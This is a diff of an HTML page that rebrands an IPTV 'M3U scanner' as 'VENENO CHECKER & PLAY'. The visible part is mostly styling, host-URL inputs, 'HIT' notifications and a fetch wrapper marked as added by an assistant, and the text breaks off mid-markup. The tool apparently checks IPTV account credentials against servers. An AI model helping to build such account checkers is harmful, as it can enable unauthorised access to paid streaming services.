@@ -1,691 +1,3032 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>JJAVIER SCANNER - ULTRA BRUTAL</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
 
-    <style>
-        :root {
-            --bg: #0a0012;
-            --card: #12001a;
-            --neon-purple: #c300ff;
-            --neon-green: #39ff14;
-            --neon-pink: #ff006e;
-            --text: #f0e6ff;
-            --text-dim: #a78bfa;
-            --danger: #ff2e63;
-            --success: #39ff14;
-        }
+<!-- BEGIN: CORS-Friendly Defaults (added by assistant) -->
+<script>
+/*
+  Global fetch wrapper: sets default mode:'cors' and credentials:'omit' when not provided.
+  This is a non-invasive change that helps when the remote server already supports CORS.
+  NOTE: This does NOT bypass servers that do NOT send Access-Control-Allow-Origin headers.
+*/
+(function(){
+  try {
+    const originalFetch = window.fetch.bind(window);
+    window.fetch = function(input, init){
+      // if init is a Request object, we need to clone/normalize it
+      if (init && init instanceof Request) {
+        init = {
+          method: init.method,
+          headers: init.headers,
+          body: init.body,
+          mode: init.mode,
+          credentials: init.credentials,
+          cache: init.cache,
+          redirect: init.redirect,
+          referrer: init.referrer,
+          integrity: init.integrity
+        };
+      } else {
+        init = init ? Object.assign({}, init) : {};
+      }
+      if (init.mode === undefined) init.mode = 'cors';
+      if (init.credentials === undefined) init.credentials = 'omit';
+      return originalFetch(input, init);
+    };
+  } catch (e) {
+    console.warn("Fetch wrapper init failed:", e);
+  }
+})();
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+// Ensure video elements use crossorigin="anonymous" so that HLS and cross-origin resources work when allowed by server
+document.addEventListener('DOMContentLoaded', function(){
+  try {
+    document.querySelectorAll('video').forEach(v => {
+      if (!v.getAttribute('crossorigin')) v.setAttribute('crossorigin', 'anonymous');
+    });
+  } catch(e) { console.warn("Failed to set video crossorigin:", e); }
+});
+</script>
+<!-- END: CORS-Friendly Defaults -->
 
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: 'Roboto Mono', monospace;
-            min-height: 100vh;
-            padding: 12px;
-            background-image: 
-                radial-gradient(circle at 10% 10%, rgba(195,0,255,0.09) 0%, transparent 45%),
-                radial-gradient(circle at 90% 90%, rgba(57,255,20,0.07) 0%, transparent 50%);
-        }
 
-        .container {
-            max-width: 1280px;
-            margin: 0 auto;
-        }
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>VENENO CHECKER & PLAY</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Rubik+Glitch&display=swap">
+<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
-        header {
-            text-align: center;
-            margin: 2rem 0 3rem;
-        }
+<style>
+:root{
+    --bg: #020b14;
+    --panel: rgba(5, 20, 30, 0.98);
+    --neon: #39ff14;
+    --neon-dim: #0a7a00;
+    --text: #e6faff;
+    --success: #39ff14;
+    --warning: #ffc857;
+    --radius: 8px;
+    --font: 'Share Tech Mono', monospace;
+    --logo-font: 'Rubik Glitch', system-ui;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
 
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: clamp(3.2rem, 10vw, 6.5rem);
-            font-weight: 900;
-            letter-spacing: -3px;
-            background: linear-gradient(90deg, var(--neon-purple), var(--neon-green), var(--neon-pink), var(--neon-purple));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 25px rgba(195,0,255,0.7),
-                         0 0 50px rgba(57,255,20,0.5);
-            animation: glitch 5s infinite;
-        }
+body {
+    background-color: var(--bg); color: var(--text); font-family: var(--font);
+    padding: 10px; min-height: 100vh;
+    overflow-x: hidden; overflow-y: auto;
+    transition: filter 0.5s;
+}
 
-        .subtitle {
-            color: var(--neon-green);
-            font-size: 1.3rem;
-            letter-spacing: 8px;
-            margin-top: 0.6rem;
-            text-shadow: 0 0 15px var(--neon-green);
-        }
+/* Partículas */
+#particles-js {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: -2;
+    pointer-events: none;
+}
 
-        .glass {
-            background: rgba(18,0,26,0.7);
-            backdrop-filter: blur(14px);
-            -webkit-backdrop-filter: blur(14px);
-            border: 1px solid rgba(195,0,255,0.2);
-            border-radius: 16px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            box-shadow: 0 0 50px rgba(0,0,0,0.7),
-                        inset 0 0 25px rgba(195,0,255,0.1);
-        }
+.particle {
+    position: absolute;
+    background: #39ff14;
+    border-radius: 50%;
+    pointer-events: none;
+    animation: particleFloat linear infinite;
+}
 
-        .controls {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 2rem;
-        }
+@keyframes particleFloat {
+    0% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: 0;
+    }
+    10% {
+        opacity: 0.3;
+    }
+    90% {
+        opacity: 0.3;
+    }
+    100% {
+        transform: translateY(-100px) rotate(360deg);
+        opacity: 0;
+    }
+}
 
-        label {
-            display: block;
-            color: var(--neon-purple);
-            font-weight: bold;
-            margin-bottom: 0.6rem;
-            font-size: 1rem;
-            letter-spacing: 1.5px;
-        }
+/* Animación shimmer */
+@keyframes shimmer {
+    0% { background-position: -200% 0; }
+    100% { background-position: 200% 0; }
+}
 
-        input[type="text"],
-        input[type="file"] {
-            width: 100%;
-            padding: 1rem;
-            background: rgba(8,0,12,0.8);
-            border: 1px solid rgba(195,0,255,0.3);
-            border-radius: 10px;
-            color: var(--text);
-            font-family: inherit;
-            font-size: 1rem;
-            transition: all 0.25s;
-        }
+.loading-shimmer {
+    background: linear-gradient(90deg, #111 25%, #222 50%, #111 75%);
+    background-size: 200% 100%;
+    animation: shimmer 1.5s infinite;
+}
 
-        input:focus {
-            outline: none;
-            border-color: var(--neon-green);
-            box-shadow: 0 0 16px rgba(57,255,20,0.5);
-        }
+/* Gradient animado */
+@keyframes gradientShift {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
 
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 1.5rem;
-        }
+.animated-gradient {
+    background: linear-gradient(90deg, #39ff14, #00ff9d, #39ff14);
+    background-size: 200% 200%;
+    animation: gradientShift 3s ease infinite;
+}
 
-        .btn {
-            flex: 1;
-            padding: 1.2rem;
-            border: none;
-            border-radius: 10px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
+/* Efecto glitch */
+@keyframes glitch {
+    0% { transform: translate(0); }
+    2% { transform: translate(-1px, 1px); }
+    4% { transform: translate(-1px, -1px); }
+    6% { transform: translate(1px, 1px); }
+    8% { transform: translate(1px, -1px); }
+    10% { transform: translate(0); }
+    100% { transform: translate(0); }
+}
 
-        .btn-start  { background: linear-gradient(45deg, #00ff9d, #39ff14); color: #000; }
-        .btn-stop   { background: linear-gradient(45deg, #ff2e63, #c300ff); color: white; }
-        .btn-clear  { background: #1a0033; color: #a78bfa; border: 1px solid #5c2d91; }
-        .btn-save   { background: linear-gradient(45deg, #7c3aed, #c300ff); padding: 0.8rem 1.6rem; font-size: 1rem; }
+.glitch-text {
+    position: relative;
+    animation: glitch 5s infinite;
+}
 
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 30px rgba(0,0,0,0.6);
-        }
+/* Bg animation original */
+#bg-animation {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    z-index: -3; pointer-events: none;
+    background: radial-gradient(circle at center, #0a2a3a 0%, #020b14 70%, #000 100%);
+}
+.mask {
+    position: absolute; bottom: -100px; fill: var(--neon); opacity: 0.08;
+    animation: floatUp linear infinite;
+}
+@keyframes floatUp {
+    0% { transform: translateY(0) rotate(0deg); opacity: 0; }
+    100% { transform: translateY(-120vh) rotate(20deg); opacity: 0; }
+}
 
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 12px;
-            margin: 2rem 0;
-        }
+.wrapper { 
+    width: 100%; max-width: 1200px; margin: 0 auto;
+    display: flex; flex-direction: column; gap: 20px;
+}
 
-        .stat {
-            background: rgba(8,0,12,0.7);
-            padding: 1.2rem;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid rgba(195,0,255,0.18);
-        }
+.header { 
+    display: flex; justify-content: center; align-items: center;
+    padding: 30px 0 20px 0;
+    position: relative;
+    z-index: 100;
+}
 
-        .stat-num {
-            font-size: 2.2rem;
-            font-weight: 900;
-            font-family: 'Orbitron', sans-serif;
-        }
+.logo-wrapper {
+    display: flex;
+    justify-content: center;
+    width: 100%;
+    padding: 0 10px;
+}
 
-        .stat-lbl {
-            font-size: 0.8rem;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            letter-spacing: 2.5px;
-            margin-top: 6px;
-            display: block;
-        }
+.logo-link {
+    display: block;
+    max-width: 800px;
+    width: 100%;
+    text-align: center;
+}
 
-        .progress-bar {
-            height: 10px;
-            background: rgba(8,0,12,0.8);
-            border-radius: 5px;
-            overflow: hidden;
-            margin: 1.5rem 0;
-        }
+.logo-text {
+    font-family: 'Rubik Glitch', system-ui;
+    font-size: 3.5rem;
+    color: #39ff14;
+    text-shadow: 
+        0 0 6px #39ff14,
+        0 0 12px #39ff14,
+        0 0 18px #39ff14,
+        0 0 24px #00ff00,
+        0 0 42px #00ff00,
+        0 0 48px #00ff00,
+        0 0 60px #00ff00;
+    margin: 0;
+    animation: venomPulse 2s infinite alternate;
+    letter-spacing: 2px;
+}
 
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, var(--neon-purple), var(--neon-green), var(--neon-pink));
-            transition: width 0.4s ease;
-        }
+.logo-subtext {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1.2rem;
+    color: #39ff14;
+    text-shadow: 0 0 5px #39ff14;
+    margin-top: 10px;
+    letter-spacing: 3px;
+}
 
-        .results-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1.5rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid rgba(195,0,255,0.2);
-        }
+@keyframes venomPulse {
+    0% {
+        text-shadow: 
+            0 0 6px #39ff14,
+            0 0 12px #39ff14,
+            0 0 18px #39ff14;
+        transform: scale(1);
+    }
+    100% {
+        text-shadow: 
+            0 0 9px #39ff14,
+            0 0 18px #00ff00,
+            0 0 27px #00ff00,
+            0 0 36px #00ff00,
+            0 0 45px #00ff00;
+        transform: scale(1.05);
+    }
+}
 
-        .results-container {
-            max-height: 55vh;
-            overflow-y: auto;
-            padding-right: 8px;
-        }
+.section-box {
+    background: var(--panel); 
+    border: 1px solid var(--neon-dim);
+    box-shadow:
+      0 0 9px rgba(57, 255, 20, 0.4),
+      0 0 3px rgba(57, 255, 20, 0.3);
+    padding: 20px;
+    display: flex; flex-direction: column; gap: 12px;
+    transition: 0.3s;
+}
 
-        .results-container::-webkit-scrollbar {
-            width: 8px;
-        }
+.section-box:hover {
+    box-shadow: 0 0 15px rgba(57, 255, 20, 0.3);
+    transform: translateY(-1px);
+}
 
-        .results-container::-webkit-scrollbar-thumb {
-            background: var(--neon-purple);
-            border-radius: 4px;
-        }
+.box-header-row {
+    display: flex; justify-content: space-between; align-items: center;
+    border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 5px;
+}
+.box-title { 
+    color: #88ff88; font-size: 0.9rem; text-transform: uppercase; margin: 0; font-weight: bold; letter-spacing: 1px;
+}
 
-        .hit-card {
-            background: linear-gradient(145deg, #12001a, #0a0012);
-            border-left: 6px solid var(--neon-green);
-            border-radius: 12px;
-            margin-bottom: 1.2rem;
-            overflow: hidden;
-            box-shadow: 0 6px 25px rgba(0,0,0,0.6);
-            animation: slideIn 0.4s;
-        }
+.status-badge { 
+    padding: 4px 12px; 
+    font-weight: bold; border-radius: 4px; font-size: 11px;
+    color: #000;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    position: relative;
+    overflow: hidden;
+}
 
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(15px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
+.status-badge::after {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -60%;
+    width: 20%;
+    height: 200%;
+    background: rgba(255, 255, 255, 0.3);
+    transform: rotate(30deg);
+    transition: 0.5s;
+}
 
-        .hit-head {
-            background: rgba(57,255,20,0.15);
-            padding: 1rem 1.5rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+.status-badge:hover::after {
+    left: 120%;
+}
 
-        .status-badge {
-            background: var(--neon-green);
-            color: black;
-            padding: 6px 14px;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 0.95rem;
-        }
+.st-idle { background: var(--neon); box-shadow: 0 0 4px var(--neon); }
+.st-run { background: var(--success); box-shadow: 0 0 6px var(--success); }
+.st-pause { background: var(--warning); box-shadow: 0 0 6px var(--warning); }
+.st-stop { background: #ff003c; box-shadow: 0 0 6px #ff003c; }
 
-        .copy-btn {
-            background: transparent;
-            border: 1px solid var(--neon-green);
-            color: var(--neon-green);
-            padding: 4px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.85rem;
-        }
+/* Botones con efectos */
+.btn {
+    background: #111; color: #aaa; border: 1px solid #444; flex: 1;
+    padding: 12px; cursor: pointer; font-family: var(--font); font-weight: bold; font-size: 13px;
+    border-radius: 4px; transition: 0.2s;
+    position: relative;
+    overflow: hidden;
+}
 
-        .hit-body {
-            padding: 1.5rem;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1.2rem;
-            font-size: 0.95rem;
-        }
+.btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(57, 255, 20, 0.4), transparent);
+    transition: 0.5s;
+}
 
-        .row {
-            margin-bottom: 0.6rem;
-        }
+.btn:hover::before {
+    left: 100%;
+}
 
-        .lbl {
-            color: var(--text-dim);
-            font-size: 0.85rem;
-        }
+.btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(57, 255, 20, 0.4);
+}
 
-        .val {
-            color: white;
-            font-weight: bold;
-        }
+.btn-main { border-color: var(--neon); color: var(--neon); }
+.btn-main:hover { background: var(--neon); color: #000; box-shadow: 0 0 9px var(--neon); }
+.btn-stop { border-color: #ff003c; color: #ff7b7b; }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; }
 
-        .categories {
-            grid-column: 1 / -1;
-            display: flex;
-            justify-content: space-around;
-            background: rgba(8,0,12,0.7);
-            padding: 1.2rem;
-            border-radius: 10px;
-            margin-top: 1rem;
-        }
+.btn-pulse {
+    animation: pulse 2s infinite;
+}
 
-        .cat-item {
-            text-align: center;
-        }
+@keyframes pulse {
+    0% {
+        box-shadow: 0 0 0 0 rgba(57, 255, 20, 0.7);
+    }
+    70% {
+        box-shadow: 0 0 0 10px rgba(57, 255, 20, 0);
+    }
+    100% {
+        box-shadow: 0 0 0 0 rgba(57, 255, 20, 0);
+    }
+}
 
-        .cat-num {
-            font-size: 2rem;
-            font-weight: 900;
-            color: var(--neon-purple);
-            text-shadow: 0 0 12px rgba(195,0,255,0.7);
-        }
+/* Tooltips */
+.tooltip {
+    position: relative;
+    display: inline-block;
+}
 
-        .cat-label {
-            font-size: 0.8rem;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            margin-top: 4px;
-        }
+.tooltip .tooltiptext {
+    visibility: hidden;
+    width: 200px;
+    background-color: #000;
+    color: #fff;
+    text-align: center;
+    padding: 5px;
+    border-radius: 4px;
+    border: 1px solid #39ff14;
+    position: absolute;
+    z-index: 1;
+    bottom: 125%;
+    left: 50%;
+    margin-left: -100px;
+    opacity: 0;
+    transition: opacity 0.3s;
+    font-size: 11px;
+}
 
-        .links-section {
-            grid-column: 1 / -1;
-            margin-top: 1rem;
-            padding-top: 1rem;
-            border-top: 1px solid rgba(195,0,255,0.2);
-            display: flex;
-            flex-direction: column;
-            gap: 0.6rem;
-        }
+.tooltip:hover .tooltiptext {
+    visibility: visible;
+    opacity: 1;
+}
 
-        .links-section a {
-            color: var(--neon-green);
-            text-decoration: none;
-            font-size: 0.9rem;
-            word-break: break-all;
-        }
+textarea {
+    width: 100%; height: 80px; background: #000; border: 1px solid var(--neon-dim);
+    border-radius: 4px; color: var(--text); padding: 10px; 
+    font-family: var(--font); resize: vertical; font-size: 12px; white-space: pre;
+}
+textarea:focus { border-color: var(--neon); box-shadow: 0 0 6px var(--neon-dim); }
 
-        .links-section .lbl {
-            color: var(--text);
-            font-weight: bold;
-            font-size: 0.95rem;
-        }
+.row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
 
-        @keyframes glitch {
-            0%, 100% { transform: translate(0); }
-            20%  { transform: translate(-4px, 4px); }
-            40%  { transform: translate(4px, -4px); }
-            60%  { transform: translate(-3px, 3px); }
-            80%  { transform: translate(3px, -3px); }
-        }
+input[type="text"], input[type="file"], select {
+    background: #000; border: 1px solid var(--neon-dim);
+    border-radius: 4px; color: var(--text); padding: 10px; font-family: var(--font); font-size: 12px;
+}
+input[type="text"]:focus, select:focus { border-color: var(--neon); box-shadow: 0 0 6px var(--neon-dim); }
 
-        @media (max-width: 768px) {
-            .controls { grid-template-columns: 1fr; }
-            .hit-body { grid-template-columns: 1fr; }
-            .btn-group { flex-wrap: wrap; }
-        }
+input[type="range"] { 
+    flex: 1; accent-color: var(--success); height: 6px;
+}
 
-        @media (max-width: 480px) {
-            h1 { font-size: 3.8rem; }
-        }
-    </style>
+.progress-track { 
+    width: 100%; height: 20px; background: #000; border-radius: 4px; 
+    overflow: hidden; position: relative; border: 1px solid #333;
+}
+.progress-fill { 
+    height: 100%;
+    background: linear-gradient(90deg, #39ff14, #00ff00);
+    width: 0%; transition: width 0.3s;
+    box-shadow: 0 0 6px #39ff14;
+}
+.progress-text { 
+    position: absolute; width: 100%; top: 0; left: 0; height: 100%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; color: #fff; text-shadow: 1px 1px 2px #000; font-weight: bold;
+}
+
+.stats-row { display: flex; gap: 10px; }
+.stat-box { 
+    flex: 1; background: #000; border: 1px solid #333; padding: 8px; 
+    text-align: center; font-size: 12px; border-radius: 4px;
+    transition: 0.3s;
+}
+.stat-box:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(57, 255, 20, 0.2);
+}
+.s-on { color: var(--success); border-color: var(--success); text-shadow: 0 0 3px rgba(57, 255, 20, 0.3); }
+.s-off { color: var(--neon); border-color: var(--neon); text-shadow: 0 0 3px rgba(57, 255, 20, 0.3); }
+
+/* Tarjetas de información */
+.info-card {
+    background: linear-gradient(145deg, #0a1a2a, #051420);
+    border: 1px solid #0a7a00;
+    border-radius: 8px;
+    padding: 15px;
+    margin: 10px 0;
+    position: relative;
+    overflow: hidden;
+}
+
+.info-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, #39ff14, transparent);
+}
+
+.server-info-item {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 5px;
+}
+
+.info-label {
+    font-size: 11px;
+    color: #888;
+    text-transform: uppercase;
+}
+
+.info-value {
+    font-size: 12px;
+    color: #39ff14;
+    font-weight: bold;
+}
+
+/* Stats avanzadas */
+.advanced-stats {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+}
+
+.stat-card {
+    flex: 1;
+    min-width: 120px;
+    background: #000;
+    border: 1px solid #333;
+    border-radius: 6px;
+    padding: 15px;
+    text-align: center;
+    transition: 0.3s;
+}
+
+.stat-card:hover {
+    border-color: #39ff14;
+    transform: translateY(-3px);
+}
+
+.stat-icon {
+    font-size: 24px;
+    margin-bottom: 8px;
+}
+
+.stat-title {
+    font-size: 10px;
+    color: #888;
+    text-transform: uppercase;
+    margin-bottom: 5px;
+}
+
+.stat-value {
+    font-size: 14px;
+    color: #39ff14;
+    font-weight: bold;
+}
+
+.terminal-window {
+    height: 200px;
+    background: #000; border: 1px solid #333; padding: 12px;
+    overflow-y: auto; font-size: 11px; border-radius: 4px;
+}
+.log-line { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 3px; display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
+.log-time { color: #555; font-size: 10px; }
+.log-msg { color: #ccc; word-break: break-all; flex: 1; }
+.log-badge { padding: 2px 6px; font-size: 10px; font-weight: bold; border-radius: 2px; }
+.lb-on { background: var(--success); color: #000; }
+.lb-off { background: #ff003c; color: #000; }
+.log-btn { 
+    background: #fff; color: #000; border: none; padding: 2px 8px; 
+    font-size: 10px; cursor: pointer; font-weight: bold; border-radius: 2px;
+}
+
+.player-layout { display: flex; flex-direction: column; gap: 10px; height: 450px; }
+@media(min-width: 900px) { .player-layout { flex-direction: row; } }
+
+.media-browser {
+    flex: 1; background: #080808; border: 1px solid #333; 
+    display: flex; flex-direction: column; border-radius: 4px;
+    min-height: 150px;
+}
+.browser-tabs { display: flex; border-bottom: 1px solid #333; }
+.tab-btn {
+    flex: 1; padding: 10px; background: #111; color: #666; border: none; 
+    cursor: pointer; font-family: var(--font); font-weight: bold; font-size: 12px;
+}
+.tab-btn.active { background: #222; color: var(--neon); border-bottom: 2px solid var(--neon); }
+.browser-list { flex: 1; overflow-y: auto; padding: 5px; }
+.list-item {
+    padding: 8px; border-bottom: 1px solid #1a1a1a; cursor: pointer; font-size: 12px; color: #aaa;
+    transition: 0.2s;
+}
+.list-item:hover { background: #222; color: #fff; }
+.is-cat { color: #fff; background: #111; font-weight: bold; border-left: 3px solid var(--neon); }
+
+/* MEJORAS PARA EL REPRODUCTOR */
+.video-wrapper {
+    flex: 2; background: #000; border: 1px solid #333; border-radius: 4px;
+    display: flex; align-items: center; justify-content: center; position: relative;
+    min-height: 400px;
+}
+video { 
+    width: 100%; 
+    height: 100%; 
+    object-fit: contain;
+    background: #000;
+}
+.vid-overlay { 
+    position: absolute; 
+    top: 0; 
+    left: 0; 
+    width: 100%; 
+    height: 100%; 
+    background: rgba(0, 0, 0, 0.95);
+    color: #39ff14; 
+    font-size: 1.2rem; 
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    padding: 20px;
+    box-sizing: border-box;
+}
+
+/* Loader animation */
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Controles adicionales */
+.video-controls {
+    position: absolute;
+    bottom: 10px;
+    left: 10px;
+    right: 10px;
+    display: flex;
+    gap: 10px;
+    z-index: 20;
+    opacity: 0;
+    transition: opacity 0.3s;
+    justify-content: center;
+}
+
+.video-wrapper:hover .video-controls {
+    opacity: 1;
+}
+
+.control-btn {
+    background: rgba(0, 0, 0, 0.8);
+    border: 1px solid #39ff14;
+    color: #39ff14;
+    padding: 8px 12px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 12px;
+    font-family: var(--font);
+}
+
+.control-btn:hover {
+    background: rgba(57, 255, 20, 0.3);
+}
+
+.text-success { color: var(--success); }
+.text-error { color: #e74c3c; }
+.text-warn { color: #f1c40f; }
+
+.credit-text {
+    font-family: var(--font);
+    font-size: 1.1rem;
+    font-weight: bold;
+    color: #39ff14;
+    text-align: center;
+    text-shadow: 
+        0 0 3px #39ff14,
+        0 0 6px #39ff14,
+        0 0 12px #39ff14,
+        0 0 24px #00ff00,
+        0 0 48px #00ff00;
+    animation: venomPulse 1.5s infinite alternate;
+}
+
+.venom-title {
+    font-family: 'Rubik Glitch', system-ui;
+    font-size: 2.5rem;
+    color: #39ff14;
+    text-shadow: 
+        0 0 6px #39ff14,
+        0 0 12px #39ff14,
+        0 0 18px #39ff14;
+    text-align: center;
+    margin: 0;
+    animation: venomGlow 2s infinite alternate;
+}
+
+@keyframes venomGlow {
+    0% { 
+        text-shadow: 0 0 6px #39ff14, 0 0 12px #39ff14, 0 0 18px #00ff00;
+        transform: scale(1); 
+        opacity: 0.9;
+    }
+    100% { 
+        text-shadow: 0 0 9px #fff, 0 0 18px #39ff14, 0 0 27px #00ff00, 0 0 36px #00ff00;
+        transform: scale(1.03); 
+        opacity: 1;
+    }
+}
+
+/* NUEVOS ESTILOS */
+.theme-selector {
+    display: flex; gap: 10px; margin: 10px 0; flex-wrap: wrap;
+}
+.theme-btn {
+    padding: 8px 15px; border: 1px solid #333; background: #000; color: #ccc;
+    cursor: pointer; border-radius: 4px; font-size: 12px; flex: 1;
+}
+
+.log-filter {
+    padding: 5px 10px; background: #222; border: 1px solid #333; color: #aaa;
+    cursor: pointer; font-size: 11px; border-radius: 4px;
+}
+.log-filter.active {
+    background: var(--neon); color: #000; border-color: var(--neon);
+}
+
+.stats-chart-container {
+    width: 100%; height: 200px; position: relative;
+}
+
+.quality-selector {
+    position: absolute; top: 10px; right: 10px; z-index: 100;
+    background: rgba(0,0,0,0.9); color: #fff; border: 1px solid var(--neon);
+    padding: 8px 12px; border-radius: 4px; font-size: 12px;
+    font-family: var(--font);
+}
+
+/* Tabla de resultados */
+table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 11px;
+}
+
+th {
+    background: #111;
+    padding: 8px;
+    border: 1px solid #333;
+    text-align: left;
+    color: #39ff14;
+}
+
+td {
+    padding: 8px;
+    border: 1px solid #333;
+}
+
+tr:nth-child(even) {
+    background: #0a0a0a;
+}
+
+tr:hover {
+    background: rgba(57, 255, 20, 0.1);
+}
+
+/* Notificaciones MEJORADAS - Solo una notificación de HIT a la vez */
+#notificationCenter {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    z-index: 10000;
+    max-width: 300px;
+}
+
+.notification {
+    background: var(--panel);
+    border-left: 3px solid #39ff14;
+    padding: 10px 12px;
+    margin-bottom: 8px;
+    min-width: 250px;
+    max-width: 300px;
+    box-shadow: 0 3px 10px rgba(0,0,0,0.5);
+    animation: slideInRight 0.3s ease, slideOutRight 0.3s ease 2.7s forwards;
+    border-radius: 4px;
+    font-size: 11px;
+    opacity: 0.95;
+    backdrop-filter: blur(5px);
+}
+
+.notification.success { border-color: #39ff14; }
+.notification.error { border-color: #ff003c; }
+.notification.warning { border-color: #ffc857; }
+.notification.info { border-color: #6fe7ff; }
+
+/* Notificación especial para HITS */
+.notification.hit {
+    border-left: 3px solid #00ff00;
+    background: rgba(5, 30, 10, 0.98);
+    animation: slideInRight 0.3s ease, slideOutRight 0.3s ease 2.7s forwards;
+}
+
+@keyframes slideInRight {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+}
+
+@keyframes slideOutRight {
+    from { transform: translateX(0); opacity: 1; }
+    to { transform: translateX(100%); opacity: 0; }
+}
+
+/* Contenido de la notificación */
+.notification-content {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.notification-icon {
+    font-size: 14px;
+    flex-shrink: 0;
+}
+
+.notification-message {
+    flex: 1;
+    font-size: 11px;
+    line-height: 1.3;
+}
+
+.notification-close {
+    background: none;
+    border: none;
+    color: #888;
+    cursor: pointer;
+    font-size: 12px;
+    padding: 0 0 0 5px;
+    flex-shrink: 0;
+}
+
+/* Fullscreen styles */
+:fullscreen .video-wrapper {
+    background: #000;
+}
+
+:fullscreen video {
+    object-fit: contain;
+}
+</style>
 </head>
 <body>
 
-<div class="container">
-    <header>
-        <h1>JJAVIER</h1>
-        <div class="subtitle">ULTRA BRUTAL SCANNER</div>
-    </header>
+<div id="particles-js"></div>
+<div id="bg-animation"></div>
 
-    <div class="glass">
-        <div class="controls">
-            <div>
-                <label>🌐 HOST URL 1 (obligatorio - incluye http:// o https://)</label>
-                <input type="text" id="host" placeholder="http://servidor-iptv.com">
+<!-- Centro de notificaciones -->
+<div id="notificationCenter"></div>
 
-                <div style="margin-top:1.5rem;">
-                    <label>🌐 HOST URL 2 (opcional)</label>
-                    <input type="text" id="host2" placeholder="http://servidor2-iptv.com">
+<div class="wrapper">
+
+    <!-- BANNER SUPERIOR VENENO -->
+    <div class="header">
+        <div class="logo-wrapper">
+            <div class="logo-link">
+                <h1 class="logo-text glitch-text">☠️ VENENO CHECKER & PLAY ☠️</h1>
+                <div class="logo-subtext">PRO M3U SCANNER & PLAYER v2.1</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ESTADO DEL SISTEMA -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">📊 ESTADO DEL SISTEMA</div>
+        </div>
+        <div class="stats-row">
+            <div class="stat-box" style="color:#39ff14; border-color:#39ff14;">
+                <div style="font-size:10px;">UPTIME</div>
+                <div id="uptimeCounter">00:00:00</div>
+            </div>
+            <div class="stat-box" style="color:#ffc857; border-color:#ffc857;">
+                <div style="font-size:10px;">RAM USADA</div>
+                <div id="ramUsage">0 MB</div>
+            </div>
+            <div class="stat-box" style="color:#6fe7ff; border-color:#6fe7ff;">
+                <div style="font-size:10px;">VELOCIDAD</div>
+                <div id="scanSpeed">0/s</div>
+            </div>
+            <div class="stat-box" style="color:#ff00ff; border-color:#ff00ff;">
